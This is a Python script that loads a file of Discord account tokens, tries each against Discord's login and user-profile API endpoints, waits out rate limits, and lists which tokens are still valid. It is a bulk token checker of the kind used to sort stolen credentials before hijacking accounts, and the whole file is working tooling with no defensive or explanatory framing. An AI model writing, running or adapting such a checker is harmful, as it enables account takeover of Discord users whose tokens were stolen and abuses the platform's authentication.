import requests
import time
import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    file_path = input("Enter the file path: ").strip()
    
    if not file_path:
        print("! No file path provided.")
        return

    token_list = load_tokens(file_path)
    if not token_list:
        print("! No tokens loaded.")
        return

    while True:
        check_and_display_results(token_list)
        choice = input("\nDo you want to check tokens again? (y/n): ").strip().lower()
        if choice != 'y':
            break

def load_tokens(file_path):
    loaded_amount = 0
    token_list = []
    try:
        with open(file_path, "r") as checklist:
            tokens = checklist.readlines()
        for token in tokens:
            token_list.append(token.strip())
            loaded_amount += 1
        print(f"\n+ {loaded_amount} Tokens Loaded")
        input("Press ENTER to start checking tokens...")
        return token_list
    except FileNotFoundError:
        print("! File not found")
        input("Press ENTER to exit")
        return []

def check_and_display_results(token_list):
    clear()
    valid_tokens = []
    invalid_tokens = []
    rate_limit = False

    for token in token_list:
        if rate_limit:
            print('! Rate limited...')
            time.sleep(60)
            rate_limit = False
        
        headers = {"Authorization": token}
        try:
            r1 = requests.post('https://discord.com/api/v9/auth/login', headers=headers)
            if r1.status_code == 429:
                rate_limit = True
                continue
            elif r1.status_code == 401:
                print(f"! Invalid: {token}")
                invalid_tokens.append(token)
                continue
            elif r1.status_code != 200:
                print(f"! Unknown error: {token} (Status Code: {r1.status_code})")
                invalid_tokens.append(token)
                continue
            
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code == 429:
                rate_limit = True
                continue
            elif r.status_code == 401:
                print(f"! Verification required: {token}")
                invalid_tokens.append(token)
            elif r.status_code == 200:
                print(f"! Valid: {token}")
                valid_tokens.append(token)
            else:
                print(f"! Unknown error: {token} (Status Code: {r.status_code})")
                invalid_tokens.append(token)

        except requests.exceptions.RequestException as e:
            print(f"! Request error: {e}")
            invalid_tokens.append(token)

    print(f"\n\n+ Results:\n")
    
    if valid_tokens:
        print("Valid tokens:")
        for token in valid_tokens:
            print(f"  + {token}")
    
    if invalid_tokens:
        print("\nInvalid tokens:")
        for token in invalid_tokens:
            print(f"  ! {token}")

if __name__ == "__main__":
    main()
